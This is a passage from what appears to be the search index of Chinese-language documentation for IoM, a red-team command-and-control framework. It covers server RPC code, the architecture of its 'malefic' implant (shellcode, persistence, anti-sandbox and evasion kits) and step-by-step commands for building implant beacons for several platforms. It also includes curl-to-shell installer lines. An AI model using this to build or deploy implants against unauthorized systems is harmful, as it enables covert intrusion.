\u6d41\u5f0fRPC","text":"<p>\u9002\u7528\u4e8e\u9700\u8981\u5206\u5757\u4f20\u8f93\u6216\u5b9e\u65f6\u6570\u636e\u6d41\u7684\u573a\u666f\uff1a</p> <p>Execute\u793a\u4f8b (\u5b9e\u65f6\u8f93\u51fa\u6d41):</p> <pre><code>func (rpc *Server) Execute(ctx context.Context, req *implantpb.ExecRequest) (*clientpb.Task, error) {\n    greq, err := newGenericRequest(ctx, req)\n    if err != nil {\n        return nil, err\n    }\n\n    if !req.Realtime {\n        // \u975e\u5b9e\u65f6\u6a21\u5f0f\uff1a\u666e\u901aRPC\n        ch, err := rpc.GenericHandler(ctx, greq)\n        if err != nil {\n            return nil, err\n        }\n        go greq.HandlerResponse(ch, types.MsgExec)\n    } else {\n        // \u5b9e\u65f6\u6a21\u5f0f\uff1a\u6d41\u5f0fRPC\n        greq.Count = -1  // \u65e0\u9650\u6d41\n        _, out, err := rpc.StreamGenericHandler(ctx, greq)\n        if err != nil {\n            return nil, err\n        }\n\n        go func() {\n            for {\n                resp := &lt;-out\n                exec := resp.GetExecResponse()\n\n                // \u9a8c\u8bc1\u54cd\u5e94\n                err := handler.AssertSpite(resp, types.MsgExec)\n                if err != nil {\n                    greq.Task.Panic(buildErrorEvent(greq.Task, err))\n                    return\n                }\n\n                // \u5904\u7406\u54cd\u5e94\n                err = greq.HandlerSpite(resp)\n                if err != nil {\n                    return\n                }\n\n                // \u68c0\u67e5\u662f\u5426\u7ed3\u675f\n                if exec.End {\n                    greq.Task.Finish(resp, \"\")\n                    break\n                }\n            }\n        }()\n    }\n\n    return greq.Task.ToProtobuf(), nil\n}\n</code></pre>"},{"location":"IoM/guideline/develop/server/#listener\u5f00\u53d1","title":"Listener\u5f00\u53d1","text":"<p>Listener\u4e0eServer\u662f\u89e3\u8026\u7684\uff0c\u53ef\u4ee5\u72ec\u7acb\u90e8\u7f72\u3002\u5f00\u53d1\u65b0\u7684Listener\u7c7b\u578b\uff1a</p> <ol> <li>\u5b9e\u73b0Pipeline\u63a5\u53e3</li> <li>\u5b9e\u73b0Parser\u63a5\u53e3 </li> <li>\u5b9e\u73b0Cryptor\u63a5\u53e3 </li> </ol> <p>\u53c2\u8003\u73b0\u6709\u7684TCP/HTTP\u5b9e\u73b0\u8fdb\u884c\u5f00\u53d1\u3002</p>"},{"location":"IoM/guideline/develop/server/#todo","title":"todo","text":""},{"location":"IoM/guideline/develop/server/#\u76f8\u5173\u8d44\u6e90","title":"\u76f8\u5173\u8d44\u6e90","text":"<ul> <li>IoM\u8bbe\u8ba1\u6587\u6863 - \u4e86\u89e3\u6574\u4f53\u67b6\u6784</li> <li>Proto\u4ed3\u5e93 - \u534f\u8bae\u5b9a\u4e49</li> <li>Client\u5f00\u53d1\u6307\u5357 - \u5ba2\u6237\u7aef\u5f00\u53d1</li> <li>Implant\u5f00\u53d1\u6307\u5357 - \u690d\u5165\u7269\u5f00\u53d1</li> </ul> <p>\u2b05\ufe0f \u8fd4\u56de\u5f00\u53d1\u8005\u6307\u5357</p>"},{"location":"IoM/manual/","title":"index","text":"<p>IoM \u662f\u4e00\u4e2a\u6781\u5176\u590d\u6742\u7684\u7cfb\u7edf, \u6211\u4eec\u5728v0.0.1-v0.1.0\u7684\u8fc7\u7a0b\u4e2d\u5411\u5176\u6dfb\u52a0\u4e86\u4f5c\u4e3a\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd\u6240\u5fc5\u987b\u7684\u4e00\u5207. \u5728\u77ed\u65f6\u95f4\u5185\u6025\u901f\u81a8\u80c0\u7684\u529f\u80fd\u5bfc\u81f4\u5404\u4e2a\u6a21\u5757\u4e4b\u95f4\u76f8\u5bf9\u72ec\u7acb, \u7f3a\u5c11\u4ea4\u4e92, \u914d\u7f6e\u590d\u6742, bug\u9891\u51fa\u7b49\u7b49\u95ee\u9898. </p> <p>\u6211\u4eec\u6b63\u5728\u79ef\u6781\u89e3\u51b3\u8fd9\u4e9b, \u4e5f\u7ee7\u7eed\u5404\u79cd\u5404\u6837\u7684\u8bd5\u7528\u53cd\u9988, \u6709\u4efb\u4f55\u4f7f\u7528\u4e0a\u7684\u7591\u95ee\u3001\u4f7f\u7528\u8fc7\u7a0b\u4e2d\u7684bug\u3001\u5e0c\u671b\u6dfb\u52a0\u7684\u529f\u80fd\u90fd\u53ef\u4ee5\u901a\u8fc7issue\u53d1\u8d77, \u6211\u4eec\u4f1a\u5c3d\u5feb\u89e3\u51b3\u3002</p> <p>\u6587\u6863\u843d\u540e</p> <p>\u6211\u4eec\u7684\u4e3b\u8981\u7cbe\u529b\u90fd\u653e\u5728\u4ee3\u7801\u4e0a\uff0c \u6587\u6863\u96be\u514d\u843d\u540e\u4e8e\u4ee3\u7801\u3002 \u597d\u5728IoM\u7684\u4ee3\u7801\u90fd\u662f\u5f00\u6e90\u7684\uff0c\u5982\u679c\u6709\u53d1\u73b0\u6587\u6863\u4e0e\u5b9e\u9645\u5bf9\u5e94\u4e0d\u4e0a\u7684\u5730\u65b9\uff0c \u6b22\u8fce\u63d0\u51faissue\uff0c\u6211\u4eec\u4f1a\u5c3d\u5feb\u4fee\u590d\u3002 </p>"},{"location":"IoM/manual/#\u6982\u89c8","title":"\u6982\u89c8","text":"<p>IoM\u7684\u4e00\u5207\u51e0\u4e4e\u90fd\u662f\u89e3\u8026\u7684, \u53ef\u63d2\u62d4\u53ef\u66ff\u6362, \u6a21\u5757\u5316\u7684. </p> <p>\u76ee\u524d\u7684IoM\u6709\u4e09\u4e2a\u4e3b\u8981\u90e8\u5206. </p> <ul> <li>client/server/listener \u4e3b\u4f53\u4ea4\u4e92\u7cfb\u7edf, \u6587\u6863</li> <li>mals\u63d2\u4ef6, \u4e00\u4e2a\u591a\u8bed\u8a00\u591aSDK\u7684\u63d2\u4ef6\u751f\u6001\u7cfb\u7edf, \u6587\u6863</li> <li>implant, \u8de8\u5e73\u53f0\u8de8\u67b6\u6784\u7684\u690d\u5165\u7269, \u6587\u6863</li> </ul>"},{"location":"IoM/manual/implant/","title":"Malefic","text":"<p>malefic \u662f\u76ee\u524dIoM\u63d0\u4f9b\u7684\u9ed8\u8ba4implant. </p> <p>\u9879\u76ee\u5730\u5740: https://github.com/chainreactors/malefic</p>"},{"location":"IoM/manual/implant/#\u67b6\u6784","title":"\u67b6\u6784","text":"<p>rust\u7684crate\u7684\u7ed3\u6784\u5c31\u662fmalefic\u7684\u7ec4\u6210\u90e8\u5206</p> <p>\u4e3b\u4f53\u7ed3\u6784:</p> <ul> <li>malefic, \u4e3b\u7a0b\u5e8f, \u5305\u542b\u4e86beacon/bind\u4e24\u79cd\u6a21\u5f0f\u7684\u5b8c\u6574\u529f\u80fd</li> <li>malefic-mutant,  \u7528\u6765\u5b9e\u73b0\u81ea\u52a8\u5316\u914d\u7f6emalefic\u7684\u5404\u79cd\u6761\u4ef6\u7f16\u8bd1\u4e0e\u7279\u6027, \u4ee5\u53ca\u751f\u6210shellcode, srdi\u7b49</li> <li>malefic-pulse, \u6700\u5c0f\u5316\u7684shellcode\u6a21\u677f, \u5bf9\u5e94CS\u7684artifact, \u80fd\u7f16\u8bd1\u51fa\u53ea\u67094kb\u7684\u4e0a\u7ebf\u9a6c, \u975e\u5e38\u9002\u5408\u88ab\u5404\u79cdloader\u52a0\u8f7d</li> <li>malefic-prelude, \u591a\u6bb5\u4e0a\u7ebf\u7684\u4e2d\u95f4\u9636\u6bb5, \u53ef\u4ee5\u5728\u8fd9\u91cc\u6309\u9700\u914d\u7f6e\u6743\u9650\u7ef4\u6301, \u53cd\u6c99\u7bb1, \u53cd\u8c03\u8bd5\u7b49\u529f\u80fd. </li> <li>malefic-srdi, \u6700\u5148\u8fdb\u7684srdi\u6280\u672f, \u6700\u5927\u7a0b\u5ea6\u51cf\u5c11PE\u7279\u5f81</li> </ul> <p>\u57fa\u7840\u5e93:</p> <ul> <li>malefic-modules, \u5404\u79cd\u6a21\u5757\u7684\u5177\u4f53\u5b9e\u73b0, v0.0.3\u6dfb\u52a0\u4e86\u8fd130\u4e2a\u539f\u751f\u6a21\u5757, \u8986\u76d6service, registry, taskscheduer, token, wmi\u7b49\u5e38\u7528\u529f\u80fd</li> <li>malefic-core, \u6838\u5fc3\u5e93, \u5b9e\u73b0beacon/bind\u4e0emodules\u7684\u4ea4\u4e92, \u53ef\u4ee5\u901a\u8fc7core\u5feb\u901f\u5b9e\u73b0\u5404\u79cd\u4e0d\u540c\u6a21\u677f\u4e0d\u540c\u9700\u6c42\u7684implant.</li> <li>malefic-proto, \u52a0\u5bc6\u4e0e\u534f\u8bae\u5e93, \u5b9a\u4e49\u4e86implant\u4e0eserver\u6570\u636e\u4ea4\u4e92\u7684\u534f\u8bae\u4e0e\u52a0\u5bc6\u65b9\u5f0f\u7b49</li> <li>malefic-helper, \u8f85\u52a9\u51fd\u6570\u5e93, \u4e5f\u662f\u5bf9\u63a5malefic-kits\u7684\u4e2d\u95f4\u5e93, kits\u4e2d\u7684api\u5c06\u4f1a\u901a\u8fc7FFI\u5728helper\u4e2d\u4e8c\u6b21\u5305\u88c5, \u5b9e\u73b0\u5bf9kit\u4e2d\u5404\u79cd\u529f\u80fd\u7684\u8c03\u7528</li> </ul> <p>kits(\u4e8c\u8fdb\u5236\u5f00\u6e90):</p> <ul> <li>malefic-win-kit, \u5b9e\u73b0\u4e86loadpe, UDRL, SRDI, CLR, \u5806\u6808\u6df7\u6dc6\u7b49\u7b49\u9ad8\u7ea7\u7279\u6027\u7684OPSEC\u5b9e\u73b0</li> <li>\u5728professional\u7248\u672c\u4e2d\u8fd8\u4f1a\u63d0\u4f9blinux\u4e0emac\u7684kit ......</li> </ul> <p>IoM\u8ba1\u5212\u63d0\u4f9b\u4e00\u6574\u5957\u4e92\u76f8\u89e3\u8026\u7684implant\u89e3\u51b3\u65b9\u6848, \u5b9e\u73b0\u5404\u4e2a\u9636\u6bb5\u5404\u79cd\u9700\u6c42\u4e0d\u540c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u751f\u6210. </p> <p>\u5728\u5df2\u7ecf\u5b9e\u73b0\u7684\u5185\u5bb9\u4e2d\u8fd8\u6709\u66f4\u591a\u7684\u5185\u5bb9\u53d7\u9650\u4e8e\u7cbe\u529b\u6ca1\u6709\u6587\u6863\u5316. \u6211\u4eec\u6682\u65f6\u7f16\u5199\u4e86\u5173\u4e8e\u4f7f\u7528\u7684\u7b80\u5355\u4ecb\u7ecd. \u540e\u7eed\u5c06\u968f\u7740\u5f00\u53d1\u8fdb\u5ea6\u9010\u6b65\u8865\u5168\u6240\u6709\u7ec4\u4ef6\u7684\u8bbe\u8ba1\u4e0eapi\u6587\u6863. </p>"},{"location":"IoM/manual/implant/build/","title":"IoM Implant \u7f16\u8bd1\u4e0e\u914d\u7f6e\u5b8c\u6574\u624b\u518c","text":"<p>\u672c\u624b\u518c\u6db5\u76d6 IoM \u690d\u5165\u4f53\u7684\u5b8c\u6574\u7f16\u8bd1\u6d41\u7a0b\u548c\u8be6\u7ec6\u914d\u7f6e\u8bf4\u660e\uff0c\u9002\u7528\u4e8e\u4ece\u5165\u95e8\u5230\u9ad8\u7ea7\u7684\u6240\u6709\u4f7f\u7528\u573a\u666f\u3002</p>"},{"location":"IoM/manual/implant/build/#\u76ee\u5f55","title":"\u76ee\u5f55","text":"<ul> <li>\u5feb\u901f\u5f00\u59cb</li> <li>\u7b2c\u4e00\u90e8\u5206\uff1a\u7f16\u8bd1\u73af\u5883\u4e0e\u67b6\u6784\u652f\u6301</li> <li>\u7b2c\u4e8c\u90e8\u5206\uff1a\u7f16\u8bd1\u65b9\u6cd5</li> <li>\u7b2c\u4e09\u90e8\u5206\uff1aMutant \u5de5\u5177</li> <li>\u7b2c\u56db\u90e8\u5206\uff1a\u690d\u5165\u4f53\u914d\u7f6e\u8be6\u89e3</li> </ul>"},{"location":"IoM/manual/implant/build/#\u5feb\u901f\u5f00\u59cb","title":"\u5feb\u901f\u5f00\u59cb","text":""},{"location":"IoM/manual/implant/build/#\u5feb\u901f\u7f16\u8bd1\u4f60\u7684\u7b2c\u4e00\u4e2amaleficbeacon","title":"\u5feb\u901f\u7f16\u8bd1\u4f60\u7684\u7b2c\u4e00\u4e2amalefic(beacon)","text":"<p>\u5982\u679c\u4f60\u662f\u7b2c\u4e00\u6b21\u4f7f\u7528 IoM\uff0c\u63a8\u8350\u4f7f\u7528 Docker \u7f16\u8bd1\u65b9\u5f0f\uff1a</p> <pre><code># 1. Clone \u6e90\u7801\uff08\u5305\u542b\u5b50\u6a21\u5757\uff09\ngit clone --recurse-submodules https://github.com/chainreactors/malefic\n\n# 2. Docker \u7f16\u8bd1\ndocker run -v \"$(pwd):/root/src\" --rm -it ghcr.io/chainreactors/malefic-builder:latest sh -c \"malefic-mutant generate beacon &amp;&amp; malefic-mutant build malefic --target x86_64-pc-windows-gnu\"\n</code></pre>"},{"location":"IoM/manual/implant/build/#\u7b2c\u4e00\u90e8\u5206\u7f16\u8bd1\u73af\u5883\u4e0e\u67b6\u6784\u652f\u6301","title":"\u7b2c\u4e00\u90e8\u5206\uff1a\u7f16\u8bd1\u73af\u5883\u4e0e\u67b6\u6784\u652f\u6301","text":""},{"location":"IoM/manual/implant/build/#11-\u652f\u6301\u7684\u67b6\u6784","title":"1.1 \u652f\u6301\u7684\u67b6\u6784","text":"<p>malefic \u7406\u8bba\u4e0a\u652f\u6301 rust \u80fd\u7f16\u8bd1\u7684\u51e0\u4e4e\u6240\u6709\u5e73\u53f0\uff0c\u5305\u62ec\u5404\u79cd\u51b7\u95e8\u67b6\u6784\u7684 IoT \u8bbe\u5907, Android \u7cfb\u7edf, iOS \u7cfb\u7edf\u7b49\u7b49 (\u6709\u76f8\u5173\u9700\u6c42\u53ef\u4ee5\u8054\u7cfb\u6211\u4eec\u5b9a\u5236\u5316\u9002\u914d)\uff0c\u5f53\u524d\u652f\u6301\u7684\u67b6\u6784\u53ef\u53c2\u8003cross-rust</p> <p>\u7ecf\u8fc7\u6d4b\u8bd5\u7684 target\uff1a</p> <ul> <li>x86_64-apple-darwin</li> <li>aarch64-apple-darwin</li> <li>x86_64-unknown-linux-musl</li> <li>i686-unknown-linux-musl</li> <li>x86_64-pc-windows-msvc</li> <li>i686-pc-windows-msvc</li> <li>x86_64-pc-windows-gnu</li> <li>i686-pc-windows-gnu</li> <li>armv7-unknown-linux-musleabihf</li> <li>armv7-unknown-linux-musleabi</li> </ul>"},{"location":"IoM/manual/implant/build/#12-\u57fa\u7840\u73af\u5883\u914d\u7f6e","title":"1.2 \u57fa\u7840\u73af\u5883\u914d\u7f6e","text":""},{"location":"IoM/manual/implant/build/#git-clone","title":"Git Clone","text":"<p>\u56e0\u4e3a malefic \u9700\u8981\u7528\u5230\u4ee3\u7801\u751f\u6210, \u5e76\u9f13\u52b1\u7528\u6237\u4fee\u6539\u4ee3\u7801, \u56e0\u6b64\u6211\u4eec\u6ca1\u6709\u5c06\u4ee3\u7801\u6253\u5305\u5230 docker \u4e2d.</p> <pre><code>git clone --recurse-submodules https://github.com/chainreactors/malefic\n</code></pre> <p>\u6ce8\u610f clone \u5b50\u9879\u76ee</p> <p>\u9700\u8981\u6dfb\u52a0<code>--recurse-submodules</code>\u9012\u5f52\u514b\u9686\u5b50\u9879\u76ee. \u5982\u679c\u5df2\u7ecf clone \u4e5f\u4e0d\u5fc5\u62c5\u5fc3,<code>git submodule update --init --recursive</code> \u5373\u53ef</p>"},{"location":"IoM/manual/implant/build/#\u4e0b\u8f7d-resources","title":"\u4e0b\u8f7d resources","text":"<p>\u5728\u4e00\u952e\u5b89\u88c5\u65f6\u4f7f\u7528install.sh\u4f1a\u81ea\u52a8\u4e0b\u8f7dresources</p> <p>resources.zip, \u5305\u542b\u4e86\u7f16\u8bd1\u9700\u8981\u7528\u5230\u7684\u9884\u7f16\u8bd1\u597d\u7684malefic-win-kit\u3001rem\u7b49\u5e93\u6587\u4ef6.</p> <p>community\u7248\u672c\u7684resources\u968f\u7740malefic\u53d1\u5e03\u65f6\u7684 release \u53d1\u5e03: https://github.com/chainreactors/malefic/releases/latest </p> <p>resources\u4e0b\u8f7d\u89e3\u538b\u540e\uff0c\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b:</p> <p></p>"},{"location":"IoM/manual/implant/build/#\u7b2c\u4e8c\u90e8\u5206\u7f16\u8bd1\u65b9\u6cd5","title":"\u7b2c\u4e8c\u90e8\u5206\uff1a\u7f16\u8bd1\u65b9\u6cd5","text":""},{"location":"IoM/manual/implant/build/#21-docker-\u7f16\u8bd1\u63a8\u8350","title":"2.1 Docker \u7f16\u8bd1\uff08\u63a8\u8350\uff09","text":"<p>docker\u4ea4\u53c9\u7f16\u8bd1\u955c\u50cf</p> <p>cross-rs/cross\u975e\u5e38\u5f3a\u5927\uff0c\u5b83\u89e3\u51b3\u4e86Rust\u7684\u7f16\u8bd1\u73af\u5883\u5b89\u88c5\u590d\u6742\u7684\u4e00\u5927\u96be\u9898\uff0c\u4f46\u662f\u5b83\u4f1a\u5bfc\u5165\u4e00\u4e9b\u7528\u6237\u76ee\u5f55\u4fe1\u606f\u7b49\uff0c\u6211\u4eec\u53c2\u8003\u4e86cross\u7684\u4ee3\u7801\u521b\u5efa\u4e86\u7528\u4e8e\u7ef4\u62a4malefic(\u5373implant)\u7f16\u8bd1\u7684\u955c\u50cf\u4ed3\u5e93chainreactors/cross-rust.     \u8fd9\u4e2a\u9879\u76ee\u6682\u65f6\u63d0\u4f9b\u4e86\u4e00\u4e9b\u4e3b\u6d41\u67b6\u6784\u7684\u7f16\u8bd1\u73af\u5883\u7684Dockerfile\u3002</p> <p>\u540c\u6807\u9898\u6240\u8bb2\uff0c\u4f7f\u7528\u8be5\u7f16\u8bd1\u65b9\u6cd5\u9700\u8981\u9700\u8981\u5148\u5b89\u88c5Docker.</p>"},{"location":"IoM/manual/implant/build/#docker-install","title":"Docker Install","text":"<p>\u53ef\u53c2\u8003\u5b98\u7f51\u4ecb\u7ecd</p> <pre><code># \u56fd\u5916\u5b89\u88c5\u8bf7\u4f7f\u7528\ncurl -fsSL https://get.docker.com | sudo bash -s docker\n# \u56fd\u5185\u5b89\u88c5\u8bf7\u4f7f\u7528\ncurl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun\n</code></pre>"},{"location":"IoM/manual/implant/build/#\u652f\u6301\u7684\u955c\u50cf","title":"\u652f\u6301\u7684\u955c\u50cf","text":"<p>\u76ee\u524d\u5df2\u7ecf\u652f\u6301\u7684\u955c\u50cf:</p> <ul> <li>ghcr.io/chainreactors/x86_64-pc-windows-msvc:nightly-2023-09-18-latest</li> <li>ghcr.io/chainreactors/i686-pc-windows-msvc:nightly-2023-09-18-latest</li> <li>ghcr.io/chainreactors/i686-pc-windows-gnu:nightly-2023-09-18-latest</li> <li>ghcr.io/chainreactors/x86_64-pc-windows-gnu:nightly-2023-09-18-latest</li> <li>ghcr.io/chainreactors/x86_64-unknown-linux-musl:nightly-2023-09-18-latest</li> <li>ghcr.io/chainreactors/i686-unknown-linux-musl:nightly-2023-09-18-latest</li> <li>ghcr.io/chainreactors/x86_64-unknown-linux-gnu:nightly-2023-09-18-latest</li> <li>ghcr.io/chainreactors/i686-unknown-linux-gnu:nightly-2023-09-18-latest</li> <li>ghcr.io/chainreactors/x86_64-apple-darwin:nightly-2023-09-18-latest</li> <li>ghcr.io/chainreactors/aarch64-apple-darwin:nightly-2023-09-18-latest</li> <li>...</li> </ul> <p>\u955c\u50cf\u4f7f\u7528\u6ce8\u610f</p> <p>ghcr.io/chainreactors/malefic-builder:latest\u662f\u4e00\u4e2a\u5305\u542b\u4e86win/linux/mac\u5e38\u7528target\u7684\u955c\u50cf. \u5982\u679c\u4e86\u89e3rust\u7684\u7f16\u8bd1\u64cd\u4f5c, \u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u955c\u50cf\u5b9e\u73b0\u5927\u591a\u6570\u7f16\u8bd1\u3002(\u5177\u4f53target\u6709i686-pc-windows-gnu,x86_64-pc-windows-gnu,x86_64-unknown-linux-musl,i686-unknown-linux-musl,x86_64-apple-darwin,aarch64-apple-darwin)</p>"},{"location":"IoM/manual/implant/build/#\u7f16\u8bd1\u547d\u4ee4","title":"\u7f16\u8bd1\u547d\u4ee4","text":"<p>\u8bf7\u6ce8\u610f\u5df2\u5b8c\u6210\u4e86\u57fa\u7840\u73af\u5883\u914d\u7f6e</p> <p>\u4f7f\u7528<code>install.sh</code> \u5b89\u88c5\u7684\u4f1a\u81ea\u52a8\u914d\u7f6e\u5bf9\u5e94\u7684\u57fa\u7840\u73af\u5883. \u5982\u679c\u662f\u624b\u52a8\u914d\u7f6e\u8bf7\u68c0\u67e5\u57fa\u7840\u73af\u5883\u914d\u7f6e</p> <p>\u4ee5<code>x86_64-unknown-linux-musl</code>\u4e3e\u4f8b, \u5728 malefic \u7684\u4ee3\u7801\u6839\u76ee\u5f55\u4e0b\u6267\u884c</p> <p>\u4f60\u53ef\u4ee5\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u6267\u884c build <pre><code># cd /user/path/malefic/\ndocker run -v \"$(pwd):/root/src\" --rm -it ghcr.io/chainreactors/malefic-builder:latest sh -c \"malefic-mutant generate beacon &amp;&amp; malefic-mutant build malefic --target x86_64-unknown-linux-musl\"\n\n# \u5982\u679c\u4e0d\u60f3\u6bcf\u6b21\u90fd\u4e0b\u8f7d\u4f9d\u8d56, \u53ef\u4ee5\u628a\u4f9d\u8d56\u8fdb\u884c\u672c\u5730\u7684\u7f13\u5b58\uff0c\ndocker run -v \"$(pwd):/root/src\" -v \"$(pwd)/cache/registry:/root/cargo/registry\" -v \"$(pwd)/cache/git:/root/cargo/git\" --rm -it ghcr.io/chainreactors/malefic-builder:latest sh -c \"malefic-mutant generate beacon &amp;&amp; malefic-mutant build malefic --target x86_64-unknown-linux-musl\"\n</code></pre></p> <p>\u5728 docker \u4e2d\u7f16\u8bd1\u901a\u8fc7 volume \u6620\u5c04\u6e90\u7801\uff0c\u7f16\u8bd1\u5b8c\u6210\u4f1a\u5728<code>./target/&lt;target_triple&gt;/release/</code>\u76ee\u5f55\u4e0b\u751f\u6210\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p>"},{"location":"IoM/manual/implant/build/#22-github-action\u7f16\u8bd1","title":"2.2 Github Action\u7f16\u8bd1","text":"<p>\u6211\u4eec\u5728Github Action\u4e2d\u4e5f\u57fa\u4e8e\u6d4b\u8bd5\u901a\u8fc7\u7684\u955c\u50cf\u505a\u4e86\u9002\u914d\u3002</p> <p>\u76ee\u524dclient+server\u5df2\u7ecf\u5185\u7f6e\u4e86Github action\u7f16\u8bd1\u7684\u547d\u4ee4\uff0c\u4f60\u53ef\u901a\u8fc7\u5728client\u7aef\u8c03\u7528<code>action build --help</code>\u67e5\u770b\u8be6\u7ec6\u7528\u6cd5\u3002 </p> <p>\u63a5\u4e0b\u6765\u53d9\u8ff0\u5982\u4f55\u624b\u52a8\u901a\u8fc7gh\u7f16\u8bd1\u3002</p> <p>\u9996\u5148, \u4f60\u9700\u8981git clone\u4e00\u4efdmalefic\u6e90\u7801\uff0c\u5e76push\u5230\u4e00\u4efd\u5230\u4f60\u7684\u4ed3\u5e93(\u5efa\u8bae\u8bbe\u7f6e\u79c1\u4eba\u4ed3\u5e93)\uff0c\u5e76\u5f00\u542fgithub action\u529f\u80fd\uff0c\u53c2\u8003\u4e0b\u56fe:</p> <p></p> <p>\u7136\u540e, \u5728\u672c\u5730\u5b89\u88c5gh cli\u5de5\u5177\uff0c\u901a\u8fc7\u8bbe\u7f6e<code>GH_TOKEN</code>\u73af\u5883\u53d8\u91cf\u6216<code>gh auth login</code>\u767b\u5f55\u4f60\u7684github\u8d26\u53f7\uff0c\u7136\u540e\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5373\u53ef\u7f16\u8bd1.</p> <p>\u6ce8\u610f: windows\u7528\u6237\u5982\u679c\u6ca1\u6709base64\u7b49\u51fd\u6570\uff0c\u5efa\u8bae\u901a\u8fc7git-bash.exe\u6267\u884c.</p>"},{"location":"IoM/manual/implant/build/#\u7f16\u8bd1\u547d\u4ee4_1","title":"\u7f16\u8bd1\u547d\u4ee4","text":"<ol> <li> <p>\u7f16\u8bd1beacon <pre><code>gh workflow run generate.yaml -f package=\"beacon\" -f malefic_config_yaml=$(base64 -w 0 &lt;/path/to/malefic_src/config.yaml&gt;) -f remark=\"write somthing..\" -f targets=\"x86_64-pc-windows-gnu\" -R &lt;username/malefic&gt;\n</code></pre></p> </li> <li> <p>\u7f16\u8bd1bind <pre><code>gh workflow run generate.yaml -f package=\"beacon\" -f malefic_config_yaml=$(base64 -w 0 &lt;/path/to/malefic_src/config.yaml&gt;) -f remark=\"write somthing..\" -f targets=\"x86_64-pc-windows-gnu\" -R &lt;username/malefic&gt;\n</code></pre></p> </li> <li> <p>\u7f16\u8bd1 pulse <pre><code>gh workflow run generate.yaml -f package=\"pulse\" -f malefic_config_yaml=$(base64 -w 0 &lt;/path/to/malefic_src/config.yaml&gt;) -f remark=\"write somthing..\" -f targets=\"x86_64-pc-windows-gnu\" -R &lt;username/malefic&gt;\n</code></pre></p> </li> <li> <p>\u7f16\u8bd1prelude <pre><code>gh workflow run generate.yaml -f package=\"prelude\" -f autorun_yaml=$(base64 -w 0 &lt;/path/to/malefic_src/autorun.yaml&gt;) -f malefic_config_yaml=$(base64 -w 0 &lt;/path/to/malefic_src/config.yaml&gt;) -f remark=\"write somthing..\" -f targets=\"x86_64-pc-windows-gnu\" -R &lt;username/malefic&gt;\n</code></pre></p> </li> <li> <p>\u7f16\u8bd1modules <pre><code>gh workflow run generate.yaml -f package=\"modules\" -f malefic_modules_features=\"execute_powershell execute_assembl...\" -f remark=\"write somthing..\" -f targets=\"x86_64-pc-windows-gnu\" -R &lt;username/malefic&gt;\n</code></pre></p> </li> </ol> <p>\u7f16\u8bd1\u5b8c\u6210\u540e\u4f60\u53ef\u4ee5\u901a\u8fc7<code>gh run list --workflow=generate.yaml -R &lt;username/malefic&gt;</code>\u67e5\u770b\u7f16\u8bd1\u7ed3\u679c\uff0c \u901a\u8fc7<code>gh run download &lt;run_id&gt; -R &lt;username/malefic&gt;</code>\u4e0b\u8f7d\u5bf9\u5e94\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6.</p> <p></p>"},{"location":"IoM/manual/implant/build/#23-\u672c\u673a\u7f16\u8bd1","title":"2.3 \u672c\u673a\u7f16\u8bd1","text":"<p>\u7531\u4e8e\u672c\u5730\u73af\u5883\u7684\u7f16\u8bd1\u66f4\u4e3a\u590d\u6742, \u53ea\u5efa\u8bae\u6709rust\u4f7f\u7528\u7ecf\u9a8c\u7684\u7528\u6237\u91c7\u7528</p> <p>\u672c\u673a\u7f16\u8bd1\u65f6\u4ea4\u53c9\u7f16\u8bd1\u914d\u7f6e\u6216\u8005\u4e0d\u540c\u7684target\u90fd\u53ef\u80fd\u6709\u4e0d\u540c\u7684\u73af\u5883\u4f9d\u8d56. \u4f8b\u5982\u7f16\u8bd1gnu\u76f8\u5173\u9700\u8981\u4f9d\u8d56\u7279\u5b9a\u7248\u672c\u7684gcc, \u7f16\u8bd1musl\u6216\u8005darwin\u4e5f\u9700\u8981\u5b89\u88c5\u5bf9\u5e94\u7684\u73af\u5883\u3002\u8fd9\u4e9b\u57fa\u7840\u73af\u5883\u914d\u7f6e\u6211\u4eec\u5728docker\u91cc\u89e3\u51b3\u4e86\u4e00\u904d\uff0c \u5bf9\u4e8e\u6ca1\u6709\u76f8\u5173\u7ecf\u9a8c\u7684\u4f7f\u7528\u8005\u4f1a\u975e\u5e38\u529d\u9000\u3002</p> <p>\u5982\u679c\u6ca1\u6709\u4e30\u5bcc\u7684rust\u4f7f\u7528\u7ecf\u9a8c\uff0c \u5efa\u8bae\u4f7f\u7528\u6211\u4eec\u63d0\u524d\u51c6\u5907\u7684docker/github aciton\u8fdb\u884c\u7f16\u8bd1</p>"},{"location":"IoM/manual/implant/build/#\u5b89\u88c5rust","title":"\u5b89\u88c5rust","text":"<p>linux\u5b89\u88c5 rust</p> <pre><code>curl https://sh.rustup.rs -sSf | sh\n</code></pre> <p>windows\u5b89\u88c5rust \u4e09\u79cd\u65b9\u5f0f\u9009\u62e9\u4e00\u79cd\u5373\u53ef:</p> <ol> <li>\u76f4\u63a5\u4e0b\u8f7d\u5b89\u88c5\u7a0b\u5e8f:  https://www.rust-lang.org/tools/install \u6216\u4f7f\u7528\u5305\u7ba1\u7406\u5de5\u5177\u4e0b\u8f7d</li> <li>scoop install <pre><code>scoop install rustup\n</code></pre></li> <li>winget install <pre><code>winget install rustup\n</code></pre></li> </ol>"},{"location":"IoM/manual/implant/build/#\u5b89\u88c5-toolchain","title":"\u5b89\u88c5 toolchain","text":"<pre><code>rustup default nightly-2023-09-18\n</code></pre>"},{"location":"IoM/manual/implant/build/#\u73af\u5883\u914d\u7f6e","title":"\u73af\u5883\u914d\u7f6e","text":"<p>\u4ea4\u53c9\u7f16\u8bd1\u5c0f\u6280\u5de7</p> <p>\u4f7f\u7528\u624b\u52a8\u4ea4\u53c9\u7f16\u8bd1\u4e5f\u53ef\u4ee5\u4f7f\u7528zigbuild\u53ef\u4ee5\u514d\u53bb\u5751\u975e\u5e38\u591a\u7684\u73af\u5883\u914d\u7f6e\u95ee\u9898</p> <pre><code>pip install cargo-zigbuild\n</code></pre> <p>\u7f16\u8bd1\u547d\u4ee4\u5982\u4e0b\uff0c\u4ee5malefic beacon\u4e3a\u4f8b:</p> <pre><code>cargo zigbuild --release -p malefic --target x86_64-pc-windows-gnu\ncargo zigbuild --release -p malefic --target 